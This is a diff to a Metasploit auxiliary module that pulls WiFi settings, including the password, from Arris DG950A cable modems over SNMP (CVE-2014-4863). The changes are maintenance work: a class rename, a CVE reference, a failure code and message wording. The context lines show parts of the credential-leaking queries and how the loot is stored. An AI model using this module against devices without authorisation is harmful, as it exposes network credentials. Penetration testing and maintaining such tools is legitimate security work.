@@ -1,11 +1,9 @@
-#
-# This module requires Metasploit: http://metasploit.com/download
+##
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SNMPClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -19,6 +17,7 @@ class Metasploit3 < Msf::Auxiliary
       },
       'References'  =>
         [
+          ['CVE','2014-4863'],
           ['URL', 'https://community.rapid7.com/community/metasploit/blog/2014/08/21/more-snmp-information-leaks-cve-2014-4862-and-cve-2014-4863']
         ],
       'Author'      => ['Deral "Percent_X" Heiland'],
@@ -38,7 +37,7 @@ class Metasploit3 < Msf::Auxiliary
       print_line("Password: #{password}")
       wifi_info << "Password: #{password}" << "\n"
     else
-      fail_with("Does not appear to be an Arris DG950A")
+      fail_with(Failure::NoTarget, "Does not appear to be an Arris DG950A")
     end
 
     # check WPA Encryption Algorithm
@@ -67,7 +66,7 @@ class Metasploit3 < Msf::Auxiliary
         print_line('Open Access Wifi is Enabled')
         wifi_info << 'Open Access WIFI is Enabled' << '\n'
 
-      # Wep enabled
+      # WEP enabled
       elsif wifi_version == '1'
         wep_type = snmp.get_value('1.3.6.1.4.1.4115.1.20.1.1.3.23.1.2.12')
         case wep_type
@@ -132,7 +131,7 @@ class Metasploit3 < Msf::Auxiliary
     loot_filename = 'arris_wifi.text'
     loot_desc     = 'Arris DG950A Wifi configuration data'
     p = store_loot(loot_name, loot_type, datastore['RHOST'], wifi_info, loot_filename, loot_desc)
-    print_status("WIFI Data saved in: #{p}")
+    print_good("WiFi Data saved in: #{p}")
   # No need to make noise
   rescue ::SNMP::UnsupportedVersion
   rescue ::SNMP::RequestTimeout
